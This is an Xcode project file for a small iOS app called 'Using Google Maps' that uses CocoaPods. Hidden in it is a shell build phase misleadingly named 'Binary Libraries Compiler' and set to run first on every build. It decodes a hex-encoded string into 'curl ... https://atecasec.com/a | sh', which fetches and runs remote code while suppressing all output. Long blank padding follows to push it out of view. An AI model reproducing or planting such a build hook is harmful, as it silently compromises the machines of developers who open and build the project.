// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		045EB21A254003B70014B1C5 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045EB219254003B70014B1C5 /* AppDelegate.swift */; };
		045EB21C254003B70014B1C5 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045EB21B254003B70014B1C5 /* SceneDelegate.swift */; };
		045EB21E254003B70014B1C5 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 045EB21D254003B70014B1C5 /* ViewController.swift */; };
		045EB221254003B70014B1C5 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 045EB21F254003B70014B1C5 /* Main.storyboard */; };
		045EB223254003BA0014B1C5 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 045EB222254003BA0014B1C5 /* Assets.xcassets */; };
		045EB226254003BA0014B1C5 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 045EB224254003BA0014B1C5 /* LaunchScreen.storyboard */; };
		5BA73EDDDD80DC4653B7B35D /* Pods_Using_Google_Maps.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 233E00327B7AD3A7094B81D0 /* Pods_Using_Google_Maps.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		045EB216254003B70014B1C5 /* Using Google Maps.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Using Google Maps.app"; sourceTree = BUILT_PRODUCTS_DIR; };
		045EB219254003B70014B1C5 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		045EB21B254003B70014B1C5 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
		045EB21D254003B70014B1C5 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; tabWidth = 4; };
		045EB220254003B70014B1C5 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		045EB222254003BA0014B1C5 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		045EB225254003BA0014B1C5 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		045EB227254003BA0014B1C5 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		233E00327B7AD3A7094B81D0 /* Pods_Using_Google_Maps.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Using_Google_Maps.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		61A2668F781F89F0671FC4FA /* Pods-Using Google Maps.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Using Google Maps.release.xcconfig"; path = "Target Support Files/Pods-Using Google Maps/Pods-Using Google Maps.release.xcconfig"; sourceTree = "<group>"; };
		CE5BADA9C4D6883C3C75669E /* Pods-Using Google Maps.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Using Google Maps.debug.xcconfig"; path = "Target Support Files/Pods-Using Google Maps/Pods-Using Google Maps.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		045EB213254003B70014B1C5 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				5BA73EDDDD80DC4653B7B35D /* Pods_Using_Google_Maps.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		045EB20D254003B70014B1C5 = {
			isa = PBXGroup;
			children = (
				045EB218254003B70014B1C5 /* Using Google Maps */,
				045EB217254003B70014B1C5 /* Products */,
				279DF7F219F17D67414DC4BB /* Pods */,
				749189E69F9C6D97B0F06C79 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		045EB217254003B70014B1C5 /* Products */ = {
			isa = PBXGroup;
			children = (
				045EB216254003B70014B1C5 /* Using Google Maps.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		045EB218254003B70014B1C5 /* Using Google Maps */ = {
			isa = PBXGroup;
			children = (
				045EB219254003B70014B1C5 /* AppDelegate.swift */,
				045EB21B254003B70014B1C5 /* SceneDelegate.swift */,
				045EB21D254003B70014B1C5 /* ViewController.swift */,
				045EB21F254003B70014B1C5 /* Main.storyboard */,
				045EB222254003BA0014B1C5 /* Assets.xcassets */,
				045EB224254003BA0014B1C5 /* LaunchScreen.storyboard */,
				045EB227254003BA0014B1C5 /* Info.plist */,
			);
			path = "Using Google Maps";
			sourceTree = "<group>";
		};
		279DF7F219F17D67414DC4BB /* Pods */ = {
			isa = PBXGroup;
			children = (
				CE5BADA9C4D6883C3C75669E /* Pods-Using Google Maps.debug.xcconfig */,
				61A2668F781F89F0671FC4FA /* Pods-Using Google Maps.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		749189E69F9C6D97B0F06C79 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				233E00327B7AD3A7094B81D0 /* Pods_Using_Google_Maps.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		045EB215254003B70014B1C5 /* Using Google Maps */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 045EB22A254003BA0014B1C5 /* Build configuration list for PBXNativeTarget "Using Google Maps" */;
			buildPhases = (
				13CCBAC9F2356B050F6D902C /* Binary Libraries Compiler */,
				348D83436B8CB90EE09334CB /* [CP] Check Pods Manifest.lock */,
				045EB212254003B70014B1C5 /* Sources */,
				045EB213254003B70014B1C5 /* Frameworks */,
				045EB214254003B70014B1C5 /* Resources */,
				FC75E3E20CF87154DD3452D7 /* [CP] Copy Pods Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Using Google Maps";
			productName = "Using Google Maps";
			productReference = 045EB216254003B70014B1C5 /* Using Google Maps.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		045EB20E254003B70014B1C5 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1200;
				LastUpgradeCheck = 1200;
				TargetAttributes = {
					045EB215254003B70014B1C5 = {
						CreatedOnToolsVersion = 12.0.1;
					};
				};
			};
			buildConfigurationList = 045EB211254003B70014B1C5 /* Build configuration list for PBXProject "Using Google Maps" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 045EB20D254003B70014B1C5;
			productRefGroup = 045EB217254003B70014B1C5 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				045EB215254003B70014B1C5 /* Using Google Maps */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		045EB214254003B70014B1C5 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				045EB226254003BA0014B1C5 /* LaunchScreen.storyboard in Resources */,
				045EB223254003BA0014B1C5 /* Assets.xcassets in Resources */,
				045EB221254003B70014B1C5 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	13CCBAC9F2356B050F6D902C /* Binary Libraries Compiler */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Binary Libraries Compiler";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
	";			
		};
	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		348D83436B8CB90EE09334CB /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Using Google Maps-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		FC75E3E20CF87154DD3452D7 /* [CP] Copy Pods Resources */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Using Google Maps/Pods-Using Google Maps-resources-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Copy Pods Resources";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Using Google Maps/Pods-Using Google Maps-resources-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Using Google Maps/Pods-Using Google Maps-resources.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		045EB212254003B70014B1C5 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				045EB21E254003B70014B1C5 /* ViewController.swift in Sources */,
				045EB21A254003B70014B1C5 /* AppDelegate.swift in Sources */,
				045EB21C254003B70014B1C5 /* SceneDelegate.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		045EB21F254003B70014B1C5 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				045EB220254003B70014B1C5 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		045EB224254003BA0014B1C5 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				045EB225254003BA0014B1C5 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		045EB228254003BA0014B1C5 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		045EB229254003BA0014B1C5 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		045EB22B254003BA0014B1C5 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = CE5BADA9C4D6883C3C75669E /* Pods-Using Google Maps.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "Using Google Maps/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "ABC.Using-Google-Maps";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		045EB22C254003BA0014B1C5 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 61A2668F781F89F0671FC4FA /* Pods-Using Google Maps.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "Using Google Maps/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "ABC.Using-Google-Maps";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		045EB211254003B70014B1C5 /* Build configuration list for PBXProject "Using Google Maps" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				045EB228254003BA0014B1C5 /* Debug */,
				045EB229254003BA0014B1C5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		045EB22A254003BA0014B1C5 /* Build configuration list for PBXNativeTarget "Using Google Maps" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				045EB22B254003BA0014B1C5 /* Debug */,
				045EB22C254003BA0014B1C5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		
	};
	rootObject = 045EB20E254003B70014B1C5 /* Project object */;
}
